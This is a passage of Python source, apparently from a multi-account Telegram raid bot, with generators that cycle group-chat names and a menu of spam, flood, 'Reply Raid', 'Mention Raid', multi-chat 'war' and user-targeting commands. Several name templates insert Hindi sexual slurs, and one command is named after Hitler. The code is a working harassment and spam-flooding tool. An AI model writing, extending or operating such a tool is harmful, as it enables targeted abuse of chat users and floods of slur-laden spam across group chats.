    lambda t, s: f"🔱 {t}{s}",
]

def _sasuke_factory(txt: str, idx: int) -> callable:
    last = _last()
    fn   = _SASUKE_TMPL[idx % len(_SASUKE_TMPL)]
    def _f():
        c = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _aizen_factory(txt: str) -> callable:
    last = _last()
    _alt = [True]
    def _f():
        if _alt[0]:
            c = f"♛ᴋɴᴏ𝐗{txt}{rnd_suffix()}"[:255]
        else:
            c = f"⚜️𓆰ᴋɴᴏ𝐗{txt}{rnd_suffix()}"[:255]
        _alt[0] = not _alt[0]
        if c == last[0]:
            _alt[0] = not _alt[0]
            c = (f"♛𓆰ᴋɴᴏ𝐗 {txt}{rnd_suffix()}" if _alt[0]
                 else f"⚜️𓆰ᴋɴᴏ𝐗{txt}{rnd_suffix()}")[:255]
        last[0] = c
        return c
    return _f

def _villain_factory(txt: str) -> callable:
    last = _last()
    _alt = [True]
    def _f():
        if _alt[0]:
            c = f"𓆰ᴋɴᴏ𝐗 {txt}{rnd_suffix()}"[:255]
        else:
            c = f"💀𝑺𝑨𝑴𝑴𝒀 {txt}{rnd_suffix()}"[:255]
        _alt[0] = not _alt[0]
        if c == last[0]:
            _alt[0] = not _alt[0]
            c = (f"𓆰ᴋɴᴏ𝐗 {txt}{rnd_suffix()}" if _alt[0]
                 else f"💀𓆰ᴋɴᴏ𝐗 {txt}{rnd_suffix()}")[:255]
        last[0] = c
        return c
    return _f

_WAVE_SYMS = ["🌊","💧","🫧","🌀","🌬️","❄️","🌙","🌊","💎","🌟"]
def _wave_factory(txt: str) -> callable:
    last = _last()
    def _f():
        w = random.choice(_WAVE_SYMS)
        c = f"{w}{txt}{rnd_suffix()}"[:255]
        if c == last[0]:
            c = f"{random.choice(_WAVE_SYMS)} {txt}{rnd_suffix()}"[:255]
        last[0] = c
        return c
    return _f

def _save_templates():
    try:
        with open(TEMPLATES_FILE, "w") as f:
            json.dump(custom_templates, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def _custom_template_factory(template: str, txt: str) -> callable:
    """
    Placeholders in template:
      {t} or {txt}  — NC text supplied by user
      {w}           — random chud word (cycles: LUND TBKC TBR TMR ...)
      {e}           — random emoji
      {n}           — counter (1, 2, 3 ...)
      {wl}          — random left wrap char  (꧁ ♛ 🔱 ...)
      {wr}          — random right wrap char (꧂ ♛ 🌊 ...)
    """
    words  = list(_CHUD_WORDS)
    widx   = [0]
    ctr    = [0]
    last   = _last()

    def _f():
        widx[0] += 1
        ctr[0]  += 1
        w  = words[widx[0] % len(words)]
        e  = rnd_emoji()
        wl = random.choice(WRAP_L)
        wr = random.choice(WRAP_R)
        c  = (template
              .replace("{txt}", txt)
              .replace("{t}",   txt)
              .replace("{w}",   w)
              .replace("{e}",   e)
              .replace("{n}",   str(ctr[0]))
              .replace("{wl}",  wl)
              .replace("{wr}",  wr))[:255]
        if c == last[0]:
            c = (c + " ·")[:255]
        last[0] = c
        return c
    return _f


def _chud_nc_factory(txt: str) -> callable:
    """
    Template: {txt}𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥{WORD} 𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ··
    Cycling words: LUND, TBKC, TBR, TMR, aarey चुदोड़े, BHEN CUDALE
    """
    words = list(_CHUD_WORDS)
    idx   = [0]
    last  = _last()

    def _f():
        word = words[idx[0] % len(words)]
        idx[0] += 1
        c = (
            f"{txt}"
            f"𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
            f"{word} "
            f"𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· "
        )[:255]
        if c == last[0]:
            idx[0] += 1
            word2 = words[idx[0] % len(words)]
            c = (
                f"{txt}"
                f"𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
                f"{word2} "
                f"𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· "
            )[:255]
        last[0] = c
        return c
    return _f


def _mgc_fire_factory(txt: str):
    last = _last()
    tmpl = [
        lambda t, s: f"🔥{t}🔥{s}",
        lambda t, s: f"⚡🔥{t}🔥⚡{s}",
        lambda t, s: f"🔥💀{t}💀🔥{s}",
        lambda t, s: f"🔥{t}𒐫💥{s}",
        lambda t, s: f"💥🔥{t}🔥💥{s}",
        lambda t, s: f"🔥⚡{t}⚡🔥{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _mgc_war_factory(txt: str):
    last = _last()
    tmpl = [
        lambda t, s: f"⚔️{t}𒐫💥{s}",
        lambda t, s: f"⚔️💀{t}💀⚔️{s}",
        lambda t, s: f"🗡️{t}⚔️{s}",
        lambda t, s: f"⚔️⚡{t}⚡⚔️{s}",
        lambda t, s: f"💀⚔️{t}⚔️💀{s}",
        lambda t, s: f"🔱{t}⚔️{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(txt, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(txt, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f

def _mgc_surge_factory(txt: str):
    bold = txt.translate(_BOLD_MAP)
    last = _last()
    tmpl = [
        lambda t, s: f"⚡𝐒𝐔𝐑𝐆𝐄 {t}{s}",
        lambda t, s: f"💎{t}💎{s}",
        lambda t, s: f"🌊{t}🌊{s}",
        lambda t, s: f"♛{t}♛{s}",
        lambda t, s: f"👑{t}👑{s}",
        lambda t, s: f"🔱{t}🔱{s}",
    ]
    def _f():
        fn = random.choice(tmpl)
        c  = fn(bold, rnd_suffix())[:255]
        if c == last[0]:
            c = fn(bold, rnd_suffix())[:255]
        last[0] = c
        return c
    return _f


_MENU = """
╔╦══════════════════════════════╦╗
║║    ⚡ 𝐓-𝐒ᴡɪᴩᴇʀꜱ⚡  ║║
║║      𝐒ʜꫝɴᴋꜱ  𝗚ᴏᴅ    ║║
╚╩══════════════════════════════╩╝

𝑻𝒚𝒑𝒆 -𝒎𝒆𝒏𝒖 <𝒏𝒖𝒎𝒃𝒆𝒓> 𝒕𝒐 𝒐𝒑𝒆𝒏 𝒂 𝒔𝒆𝒄𝒕𝒊𝒐𝒏:

  𝟏  🔥 𝑵𝑪 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔
  𝟐  🔧 𝑬𝒏𝒈𝒊𝒏𝒆𝒔
  𝟑  💥 𝑪𝒉𝒖𝒅 𝑵𝑪 (𝑩𝒆𝒔𝒕)
  𝟒  🎯 𝑻𝒂𝒓𝒈𝒆𝒕 𝑺𝒚𝒔𝒕𝒆𝒎
  𝟓  🖼️ 𝑮𝑪 𝑷𝑭𝑷 𝑳𝒐𝒐𝒑
  𝟔  🏛️ 𝑮𝑪 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕
  𝟕  💬 𝑺𝒑𝒂𝒎 & 𝑺𝒍𝒊𝒅𝒆
  𝟖  ⚡ 𝑺𝒑𝒂𝒎 𝑴𝒐𝒅𝒆𝒔
  𝟗  🔁 𝑭𝒍𝒐𝒐𝒅 & 𝑻𝒂𝒈
 𝟏𝟎  ⚔️ 𝑹𝒆𝒑𝒍𝒚 𝑹𝒂𝒊𝒅 (𝑹𝑹)
 𝟏𝟏  🎨 𝑪𝒖𝒔𝒕𝒐𝒎 𝑻𝒆𝒎𝒑𝒍𝒂𝒕𝒆𝒔
 𝟏𝟐  🗑️ 𝑷𝒖𝒓𝒈𝒆
 𝟏𝟑  ⚔️ 𝑾𝒂𝒓 𝑪𝒐𝒏𝒕𝒓𝒐𝒍
 𝟏𝟒  ⚡ 𝑺𝒂𝒔𝒖𝒌𝒆 𝑵𝑪𝒔
 𝟏𝟓  🌀 𝑹𝒂𝒏𝒅𝒐𝒎𝑪𝒐𝒅 𝑵𝑪
 𝟏𝟔  🎭 𝑭𝒓𝒊𝒆𝒏𝒅𝒔 𝑵𝑪𝒔
 𝟏𝟕  🤖 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍
 𝟏𝟖  🔐 𝑺𝒖𝒅𝒐
 𝟏𝟗  🛠 𝑻𝒐𝒐𝒍𝒔
 𝟐𝟎  🌐 𝑴𝒖𝒍𝒕𝒊-𝑮𝑪 𝑵𝑪

╔════════════════════════════════╗
║  𝑷𝑹𝑬𝑭𝑰𝑿: - (𝒎𝒊𝒏𝒖𝒔)          ║
║  𝑩𝑶𝑻𝑺: 𝟏𝟎 𝒂𝒄𝒕𝒊𝒗𝒆 | 𝟏𝟒 𝒎𝒂𝒙  ║
╚════════════════════════════════╝""".strip()

_MENU_SECTIONS = [
    # 1 — NC Commands
    ("┌────── 🔥 𝑵𝑪 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺 ──────┐\n"
     "│ -𝐧𝐜 <𝐭>      𝐁𝐚𝐬𝐢𝐜 𝐍𝐂      │\n"
     "│ -𝐬𝐧𝐜 <𝐭>     ⚡ 𝐒𝐔𝐑𝐆𝐄 𝐍𝐂   │\n"
     "│ -𝐚𝐧𝐬𝐡𝐠𝐨𝐝 <𝐭>  👑 𝐆𝐎𝐃 𝐍𝐂    │\n"
     "│ -𝐬𝐚𝐬𝐮𝐤𝐞𝐠𝐨𝐝 <𝐭> 🗡️ 𝐒𝐊𝐄 𝐆𝐎𝐃  │\n"
     "│ -𝐬𝐚𝐬𝐮𝐤𝐞𝟏 <𝐭>  ⚡ 𝐒𝐓𝐀𝐆𝐆𝐄𝐑   │\n"
     "│ -𝐭𝐫𝐢𝐨𝐠𝐨𝐝 <𝐭>  🔱 𝟑·𝟑·𝟒      │\n"
     "│ -𝐬𝐢𝐥𝐤𝐧𝐜 <𝐭>   🪡 𝐒𝐈𝐋𝐊 𝐍𝐂    │\n"
     "│ -𝐜𝐡𝐮𝐝 <𝐭>     💥 𝐁𝐄𝐒𝐓 𝐍𝐂    │\n"
     "│ -𝐛𝐨𝐥𝐝𝐧𝐜 <𝐭>   𝐁𝐎𝐋𝐃 𝐍𝐂      │\n"
     "│ -𝐜𝐮𝐫𝐬𝐢𝐯𝐞𝐧𝐜 <𝐭> 𝑪𝒖𝒓𝒔𝒊𝒗𝒆 𝐍𝐂 │\n"
     "│ -𝐢𝐭𝐚𝐥𝐢𝐜𝐧𝐜 <𝐭> 𝘐𝘵𝘢𝘭𝘪𝘤 𝐍𝐂    │\n"
     "│ -𝐰𝐚𝐯𝐞𝐧𝐜 <𝐭>   𝐖𝐚𝐯𝐞 𝐍𝐂      │\n"
     "│ -𝐚𝐢𝐳𝐞𝐧𝐧𝐜 <𝐭>  ♛ 𝐀𝐈𝐙𝐄𝐍      │\n"
     "│ -𝐯𝐢𝐥𝐥𝐚𝐢𝐧𝐧𝐜 <𝐭> 𖤍 𝐕𝐈𝐋𝐋𝐀𝐈𝐍  │\n"
     "│ -𝐬𝐞𝐭𝐝𝐞𝐥𝐚𝐲 <𝐬> 𝐒𝐞𝐭 𝐝𝐞𝐥𝐚𝐲   │\n"
     "│ -𝐬𝐭𝐨𝐩         𝐒𝐭𝐨𝐩 𝐀𝐋𝐋      │\n"
     "└───────────────────────────────┘"),
    # 2 — Engines
    ("┌────── 🔧 𝑬𝑵𝑮𝑰𝑵𝑬𝑺 ────────────┐\n"
     "│ -𝐩𝐡𝐚𝐧𝐭𝐨𝐦 <𝐭>  𝐙𝐞𝐫𝐨-𝐣𝐢𝐭𝐭𝐞𝐫  │\n"
     "│ -𝐭𝐞𝐬𝐭𝐚𝐦𝐞𝐧𝐭 <𝐭> 𝐌𝐚𝐱 𝐬𝐩𝐞𝐞𝐝  │\n"
     "│ -𝐬𝐡𝐚𝐝𝐨𝐰 <𝐭>   𝐓𝐫𝐢𝐨 𝐬𝐭𝐚𝐠𝐠𝐞𝐫 │\n"
     "│ 𝘚𝘦𝘵 𝘣𝘦𝘧𝘰𝘳𝘦 𝘕𝘊 𝘤𝘰𝘮𝘮𝘢𝘯𝘥      │\n"
     "└───────────────────────────────┘"),
    # 3 — Chud NC
    ("┌────── 💥 𝑪𝑯𝑼𝑫 𝑵𝑪 (𝑩𝑬𝑺𝑻) ─────┐\n"
     "│ -𝐜𝐡𝐮𝐝 <𝐭𝐱𝐭>                   │\n"
     "│ 𝘛𝘦𝘮𝘱: [chud {t}𒐫💥{W}]       │\n"
     "│ 𝘞𝘰𝘳𝘥𝘴: LUND TBKC TBR TMR     │\n"
     "│   aarey चुदोड़े BHEN CUDALE    │\n"
     "│ 𝘗𝘪𝘱𝘦𝘭𝘪𝘯𝘦 · 𝘡𝘦𝘳𝘰-𝘑𝘪𝘵𝘵𝘦𝘳     │\n"
     "└───────────────────────────────┘"),
    # 4 — Target System
    ("┌────── 🎯 𝑻𝑨𝑹𝑮𝑬𝑻 𝑺𝒀𝑺𝑻𝑬𝑴 ──────┐\n"
     "│ -𝐭𝐚𝐫𝐠𝐞𝐭𝐬𝐥𝐢𝐝𝐞 <𝐮𝐢𝐝>            │\n"
     "│  𝘛𝘢𝘳𝘨𝘦𝘵 𝘮𝘴𝘨 → 𝘣𝘶𝘳𝘴𝘵 𝘴𝘭𝘪𝘥𝘦  │\n"
     "│ -𝐬𝐭𝐨𝐩𝐭𝐚𝐫𝐠𝐞𝐭𝐬𝐥𝐢𝐝𝐞              │\n"
     "│ -𝐭𝐚𝐫𝐠𝐞𝐭𝐫𝐞𝐩𝐥𝐲 <𝐮𝐢𝐝> <𝐭>      │\n"
     "│  𝘛𝘢𝘳𝘨𝘦𝘵 𝘮𝘴𝘨 → 𝘢𝘶𝘵𝘰 𝘳𝘦𝘱𝘭𝘺   │\n"
     "│ -𝐬𝐭𝐨𝐩𝐭𝐚𝐫𝐠𝐞𝐭𝐫𝐞𝐩𝐥𝐲              │\n"
     "└───────────────────────────────┘"),
    # 5 — GC PFP Loop
    ("┌────── 🖼️ 𝑮𝑪 𝑷𝑭𝑷 𝑳𝑶𝑶𝑷 ────────┐\n"
     "│ -𝐚𝐝𝐝𝐩𝐟𝐩    𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘱𝘩𝘰𝘵𝘰    │\n"
     "│ -𝐩𝐟𝐩𝐥𝐨𝐨𝐩 <𝐬𝐞𝐜> 𝘚𝘵𝘢𝘳𝘵 𝘭𝘰𝘰𝘱   │\n"
     "│ -𝐬𝐭𝐨𝐩𝐩𝐟𝐩𝐥𝐨𝐨𝐩 𝘚𝘵𝘰𝘱           │\n"
     "│ -𝐬𝐞𝐭𝐩𝐟𝐩𝐨𝐧𝐜𝐞  𝘎𝘊 𝘱𝘩𝘰𝘵𝘰 1𝘹    │\n"
     "│ -𝐝𝐞𝐥𝐞𝐭𝐞𝐠𝐜𝐩𝐟𝐩 𝘙𝘦𝘮𝘰𝘷𝘦 𝘱𝘩𝘰𝘵𝘰  │\n"
     "│ -𝐩𝐟𝐩𝐩𝐨𝐨𝐥   𝘚𝘩𝘰𝘸 𝘱𝘰𝘰𝘭 𝘴𝘪𝘻𝘦   │\n"
     "│ -𝐜𝐥𝐞𝐚𝐫𝐩𝐟𝐩  𝘊𝘭𝘦𝘢𝘳 𝘱𝘰𝘰𝘭       │\n"
     "└───────────────────────────────┘"),
    # 6 — GC Management
    ("┌────── 🏛️ 𝑮𝑪 𝑴𝑨𝑵𝑨𝑮𝑬𝑴𝑬𝑵𝑻 ─────┐\n"
     "│ -𝐠𝐜𝐢𝐧𝐟𝐨       𝐆𝐫𝐨𝐮𝐩 𝐢𝐧𝐟𝐨    │\n"
     "│ -𝐬??𝐭𝐠𝐜𝐭𝐢𝐭𝐥𝐞 <𝐭> 𝐒𝐞𝐭 𝐭𝐢𝐭𝐥𝐞  │\n"
     "│ -𝐬𝐞𝐭𝐠𝐜𝐝𝐞𝐬𝐜 <𝐭>  𝐒𝐞𝐭 𝐝𝐞𝐬𝐜   │\n"
     "│ -𝐠𝐞𝐭𝐢𝐧𝐯𝐢𝐭𝐞    𝐈𝐧𝐯𝐢𝐭𝐞 𝐥𝐢𝐧𝐤  │\n"
     "│ -𝐩𝐢𝐧𝐦𝐬𝐠       𝐏𝐢𝐧 𝐫𝐞𝐩𝐥𝐢𝐞𝐝  │\n"
     "│ -𝐮𝐧𝐩𝐢𝐧𝐚𝐥𝐥     𝐔𝐧𝐩𝐢𝐧 𝐚𝐥𝐥    │\n"
     "│ -𝐤𝐢𝐜𝐤𝐮𝐬𝐞𝐫 <𝐢𝐝> 𝐊𝐢𝐜𝐤        │\n"
     "│ -𝐛𝐚𝐧𝐭𝐚𝐫𝐠𝐞𝐭 <𝐢𝐝> 𝐁𝐚𝐧        │\n"
     "│ -𝐮𝐧𝐛𝐚𝐧𝐮𝐬𝐞𝐫 <𝐢𝐝> 𝐔𝐧𝐛𝐚𝐧      │\n"
     "│ -𝐦𝐮𝐭𝐞𝐮𝐬𝐞𝐫 <𝐢𝐝>  𝐌𝐮𝐭𝐞       │\n"
     "│ -𝐮𝐧𝐦𝐮𝐭𝐞𝐮𝐬𝐞𝐫 <𝐢𝐝> 𝐔𝐧𝐦𝐮𝐭𝐞   │\n"
     "└───────────────────────────────┘"),
    # 7 — Spam & Slide
    ("┌────── 💬 𝑺𝑷𝑨𝑴 & 𝑺𝑳𝑰𝑫𝑬 ───────┐\n"
     "│ -𝐬𝐩𝐚𝐦 <𝐭>      𝐒𝐩𝐚𝐦 𝐦𝐬𝐠     │\n"
     "│ -𝐬𝐭𝐨𝐩𝐬𝐩𝐚𝐦      𝐒𝐭𝐨𝐩          │\n"
     "│ -𝐬𝐥𝐢𝐝𝐞𝐬𝐩𝐚𝐦 <𝐭> 𝐒𝐥𝐢𝐝𝐞 𝐬𝐩𝐚𝐦  │\n"
     "│ -𝐬𝐭𝐨𝐩𝐬𝐥𝐢𝐝𝐞     𝐒𝐭𝐨𝐩          │\n"
     "│ -𝐚𝐮𝐭𝐨𝐫𝐞𝐩𝐥𝐲 <𝐭>  𝐀𝐮𝐭𝐨 𝐫𝐞𝐩𝐥𝐲 │\n"
     "│ -𝐬𝐭𝐨𝐩𝐫𝐞𝐩𝐥𝐲      𝐒𝐭𝐨𝐩          │\n"
     "│ -𝐫𝐞𝐚𝐜𝐭 <𝐞>      𝐀𝐮𝐭𝐨 𝐫𝐞𝐚𝐜𝐭  │\n"
     "│ -𝐬𝐭𝐨𝐩𝐫𝐞𝐚𝐜𝐭      𝐒𝐭𝐨𝐩          │\n"
     "└───────────────────────────────┘"),
    # 8 — Spam Modes
    ("┌────── ⚡ 𝑺𝑷𝑨𝑴 𝑴𝑶𝑫𝑬𝑺 ─────────┐\n"
     "│ -𝐬𝐰𝐢𝐩𝐞𝐬𝐩𝐚𝐦 <𝐭> 🌊 [-𝐬𝐬]     │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐬𝐬                   │\n"
     "│ -𝐛𝐮𝐫𝐬𝐭𝐬𝐩𝐚𝐦 <𝐭>[𝐧] 💥 [-𝐛𝐬]   │\n"
     "│  𝘐𝘯𝘴𝘵𝘢𝘯𝘵 𝘕 𝘮𝘦𝘴𝘴𝘢𝘨𝘦𝘴          │\n"
     "│ -𝐜𝐡𝐮𝐝𝐬𝐩𝐚𝐦 <𝐭> [-𝐜𝐬]          │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐜𝐬                   │\n"
     "│ -𝐫𝐚𝐩𝐢𝐝𝐟𝐢𝐫𝐞 <𝐭> ⚡ [-𝐫𝐚𝐩]      │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐫𝐚𝐩                  │\n"
     "│ -𝐜𝐨𝐩𝐲𝐬𝐩𝐚𝐦 <𝐭>  𝐒𝐭𝐨𝐩: -𝐬𝐭𝐨𝐩  │\n"
     "└───────────────────────────────┘"),
    # 9 — Flood & Tag
    ("┌────── 🔁 𝑭𝑳𝑶𝑶𝑫 & 𝑻𝑨𝑮 ────────┐\n"
     "│ -𝐫𝐞𝐩𝐥𝐲𝐟𝐥𝐨𝐨𝐝 <𝐭> [-𝐫𝐟]        │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐫𝐟                   │\n"
     "│ -𝐭𝐚𝐠𝐬𝐩𝐚𝐦 <𝐢𝐝> <𝐭> [-𝐭𝐬]      │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐭𝐬                   │\n"
     "└───────────────────────────────┘"),
    # 10 — Reply Raid
    ("┌────── ⚔️ 𝑹𝑬𝑷𝑳𝒀 𝑹𝑨𝑰𝑫 (𝑹𝑹) ───┐\n"
     "│ -𝐫𝐫 <𝐭>   𝐑𝐞𝐩𝐥𝐲 𝐑𝐚𝐢𝐝         │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐫𝐫                   │\n"
     "│ -𝐦𝐫 <𝐭>   𝐌𝐚𝐬𝐬 𝐑𝐞𝐩𝐥𝐲 (𝐨𝐧𝐜𝐞) │\n"
     "│ -𝐦𝐫𝐚𝐢𝐝 <𝐢𝐝> <𝐭> 𝐌𝐞𝐧𝐭𝐢𝐨𝐧 𝐑𝐚𝐢𝐝│\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐦𝐫𝐚𝐢𝐝               │\n"
     "│ -𝐫𝐬 <𝐭>   𝐑𝐑 𝐒𝐩𝐚𝐦 𝐋𝐨𝐨𝐩       │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐫𝐬                   │\n"
     "│ -𝐫𝐥 <𝐭>   𝐑𝐑 𝐋𝐨𝐨𝐩             │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐫𝐥                   │\n"
     "│ -𝐫𝐛 <𝐭> [𝐧] 𝐁𝐮𝐫𝐬𝐭 𝐍 𝐫𝐞𝐩𝐥𝐢𝐞𝐬│\n"
     "│ -𝐦𝐫𝐫 <𝐭>  𝐀𝐋𝐋 𝐛𝐨𝐭𝐬 ⚡         │\n"
     "│  𝐒𝐭𝐨𝐩: -𝐬𝐦𝐫𝐫                  │\n"
     "└───────────────────────────────┘"),
    # 11 — Custom Templates
    ("┌────── 🎨 𝑪𝑼𝑺𝑻𝑶𝑴 𝑵𝑪 𝑻𝑷𝑳 ─────┐\n"
     "│ -𝐚𝐝𝐝𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞 <𝐧> <𝐭𝐩𝐥>      │\n"
     "│  {𝐭}/{𝐭𝐱𝐭} → 𝐭𝐞𝐱𝐭             │\n"
     "│  {𝐰} → 𝐰𝐨𝐫𝐝  {𝐞} → 𝐞𝐦𝐨𝐣𝐢    │\n"
     "│  {𝐧} → 𝐜𝐨𝐮𝐧𝐭𝐞𝐫               │\n"
     "│  {𝐰𝐥}/{𝐰𝐫} → 𝐰𝐫𝐚𝐩 𝐜𝐡𝐚𝐫𝐬     │\n"
     "│ -𝐜𝐧𝐜 <𝐧> <𝐭>  𝐑𝐮𝐧 𝐍𝐂         │\n"
     "│ -𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬   𝐋𝐢𝐬𝐭 𝐬𝐚𝐯𝐞𝐝     │\n"
     "│ -𝐩𝐫𝐞𝐯𝐢𝐞𝐰 <𝐧> <𝐭> 𝐏𝐫𝐞𝐯𝐢𝐞𝐰   │\n"
     "│ -𝐝𝐞𝐥𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞 <𝐧>              │\n"
     "│ -𝐜𝐥𝐞𝐚𝐫𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬              │\n"
     "└───────────────────────────────┘"),
    # 12 — Purge
    ("┌────── 🗑️ 𝑷𝑼𝑹𝑮𝑬 ──────────────┐\n"
     "│ -𝐩𝐮𝐫𝐠𝐞 [𝐧]    𝐋𝐚𝐬𝐭 𝐍 𝐝𝐞𝐥    │\n"
     "│ -𝐩𝐮𝐫𝐠𝐞𝐦𝐞 [𝐧]  𝐎𝐰𝐧 𝐦𝐬𝐠𝐬     │\n"
     "│ -𝐩𝐮𝐫𝐠𝐞𝐛𝐨𝐭     𝐁𝐨𝐭 𝐦𝐬𝐠𝐬     │\n"
     "│ -𝐩𝐮𝐫𝐠𝐞𝐚𝐥𝐥     𝟓𝟎𝟎 𝐦𝐬𝐠𝐬     │\n"
     "└───────────────────────────────┘"),
    # 13 — War Control
    ("┌────── ⚔️ 𝑾𝑨𝑹 𝑪𝑶𝑵𝑻𝑹𝑶𝑳 ──────┐\n"
     "│ -𝐧𝐜𝐝𝐞𝐥       𝐍𝐂 + 𝐝𝐞𝐥 𝐦𝐬𝐠𝐬 │\n"
     "│ -𝐧𝐜𝐰𝐚𝐫 <𝐭>   𝐖𝐚𝐫 𝐍𝐂 𝐦𝐨𝐝𝐞   │\n"
     "│ -𝐬𝐭𝐨𝐩𝐧𝐜𝐰𝐚𝐫   𝐒𝐭𝐨𝐩 𝐰𝐚𝐫      │\n"
     "│ -𝐦𝐮𝐥𝐭𝐢𝐰𝐚𝐫 <𝐭> 🎯 𝐀𝐋𝐋 𝐆𝐂𝐬   │\n"
     "│ -𝐬𝐭𝐨𝐩𝐦𝐰𝐚𝐫    𝐒𝐭𝐨𝐩 𝐦𝐮𝐥𝐭𝐢    │\n"
     "│ -𝐦𝐮𝐭𝐞        𝐌𝐮𝐭𝐞 𝐜𝐡𝐚𝐭      │\n"
     "│ -𝐮𝐧𝐦𝐮𝐭𝐞      𝐔𝐧𝐦𝐮𝐭𝐞 𝐜𝐡𝐚𝐭   │\n"
     "└───────────────────────────────┘"),
    # 14 — Sasuke NCs
    ("┌────── ⚡ 𝑺𝑨𝑴𝑴𝒀 𝑵𝑪𝑺 ────────┐\n"
     "│ -𝐬𝐚𝐬𝐮𝐤𝐞𝐧𝐜𝐬  𝐀𝐥𝐥 𝟏𝟎 𝐒𝐚𝐬𝐮𝐤𝐞  │\n"
     "│ (𝘈𝘶𝘵𝘰 𝘤𝘺𝘤𝘭𝘦𝘴 𝘢𝘭𝘭 𝘵𝘩𝘦𝘮𝘦𝘴)    │\n"
     "└───────────────────────────────┘"),
    # 15 — RandomCod NC
    ("┌────── 🌀 𝑹𝑨𝑵𝑫𝑶𝑴𝑪𝑶𝑫 𝑵𝑪 ─────┐\n"
     "│ -𝐫𝐚𝐧𝐝𝐨𝐦𝐜𝐨𝐝 <𝐭>               │\n"
     "│ -𝐠𝐨𝐝𝐜𝐨𝐝 <𝐭>  👑 𝐆𝐎𝐃 𝐯𝐞𝐫     │\n"
     "│ (𝘊𝘺𝘤𝘭𝘦𝘴 𝘢𝘭𝘭 𝘧𝘳𝘪𝘦𝘯𝘥𝘴 𝘭𝘪𝘯𝘦𝘴)  │\n"
     "└───────────────────────────────┘"),
    # 16 — Friends NCs
    ("┌────── 🎭 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 𝑵𝑪𝑺 ───────┐\n"
     "│ -𝐤𝐞𝐧𝐭𝐨𝐧𝐜    -𝐚𝐧𝐬𝐡𝐧𝐜         │\n"
     "│ -𝐜𝐫𝟕𝐧𝐜      -𝐰𝐚𝐡𝐚𝐛𝐧𝐜        │\n"
     "│ -𝐬𝐮𝐧𝐧𝐲𝐧𝐜    -𝐭𝐲𝐬𝐨𝐧𝐧𝐜        │\n"
     "│ -𝐳𝐞𝐧𝐢𝐧𝐜     -𝐫𝐞𝐱𝐧𝐜          │\n"
     "│ -𝐚𝐫𝐧𝐚𝐯𝐧𝐜    -𝐬𝐚𝐬𝐮𝐤𝐞𝐧𝐜       │\n"
     "│ -𝐨𝐛𝐢𝐭𝐨𝐧𝐜    -𝐫𝐚𝐢𝐬𝐞𝐧𝐧𝐜       │\n"
     "│ -𝐫𝐞𝐱𝐱𝐧𝐜     -𝐬𝐡𝐨𝐮𝐫𝐲𝐚𝐧𝐜      │\n"
     "│ -𝐚𝐢𝐳𝐞𝐧𝐧𝐜    -𝐚𝐦𝐚𝐧𝐧𝐜         │\n"
     "│ -𝐞𝐫𝐫𝐨𝐫𝐧𝐜    -𝐯𝐢𝐨𝐧𝐜          │\n"
     "│ -𝐚𝐫𝐞𝐬𝐧𝐜     -𝐯𝐢𝐥𝐥𝐚𝐢𝐧𝐧𝐜      │\n"
     "│ -𝐲𝐚𝐬𝐡𝐧𝐜     -𝐡𝐢𝐭𝐥𝐞𝐫𝐧𝐜       │\n"
     "│ -𝐧𝐨𝐬𝐭𝐧𝐜     -𝐲𝐨𝐮𝐫𝐬𝐨𝐧𝐜       │\n"
     "│ -𝐤𝐰𝐞𝐟𝐧𝐜     -𝐰𝐚𝐬𝐢𝐦𝐧𝐜        │\n"
     "└───────────────────────────────┘"),
    # 17 — Bot Control
    ("┌────── 🤖 𝑩𝑶𝑻 𝑪𝑶𝑵𝑻𝑹𝑶𝑳 ───────┐\n"
     "│ -𝐛𝐨𝐭𝐬        𝐋𝐢𝐬𝐭 𝐚𝐥𝐥 𝐛𝐨𝐭𝐬 │\n"
     "│ -𝐚𝐝𝐝𝐛𝐨𝐭      𝐀𝐝𝐝 + 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 │\n"
     "│ -𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐛𝐨𝐭  𝐏𝐫𝐨𝐦𝐨𝐭𝐞 𝐛𝐨𝐭𝐬 │\n"
